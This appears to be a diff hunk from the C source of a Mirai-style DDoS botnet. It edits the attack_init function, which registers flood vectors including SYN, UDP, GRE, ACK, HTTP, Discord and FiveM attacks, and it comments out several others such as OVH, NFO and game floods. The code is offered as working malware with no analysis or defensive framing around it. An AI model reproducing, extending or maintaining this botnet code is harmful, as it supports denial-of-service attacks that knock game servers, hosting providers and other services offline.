@@ -27,22 +27,22 @@ BOOL attack_init(void)
 
     add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
     add_attack(ATK_VEC_UDP_FLOOD, (ATTACK_FUNC)attack_udp_thread);
-    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_nudp);
-    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
+    //add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_nudp);
+    //add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
     add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
     add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
     add_attack(ATK_VEC_SACK2, (ATTACK_FUNC)attack_tcp_sack2);
     add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_udp_stdhex);
-    add_attack(ATK_VEC_STREAM, (ATTACK_FUNC)attack_tcpstream);
+    //add_attack(ATK_VEC_STREAM, (ATTACK_FUNC)attack_tcpstream);
     add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket);
-    add_attack(ATK_VEC_TCPWRA, (ATTACK_FUNC)attack_wraflood);
-    add_attack(ATK_VEC_OVH, (ATTACK_FUNC)attack_ovh);
+    //add_attack(ATK_VEC_TCPWRA, (ATTACK_FUNC)attack_wraflood);
+    //add_attack(ATK_VEC_OVH, (ATTACK_FUNC)attack_ovh);
     add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_stomp);
     add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
-    add_attack(ATK_VEC_TCPBYPASS, (ATTACK_FUNC)attack_tcp_bypass);
-    add_attack(ATK_VEC_NFO, (ATTACK_FUNC)attack_nfo);
+    //add_attack(ATK_VEC_TCPBYPASS, (ATTACK_FUNC)attack_tcp_bypass);
+    //add_attack(ATK_VEC_NFO, (ATTACK_FUNC)attack_nfo);
     add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
-    add_attack(ATK_VEC_GAME, (ATTACK_FUNC)attack_game);
+    //add_attack(ATK_VEC_GAME, (ATTACK_FUNC)attack_game);
     add_attack(ATK_VEC_DISCORD, (ATTACK_FUNC)attack_discord);
     add_attack(ATK_VEC_FIVEM, (ATTACK_FUNC)attack_fivem);
 
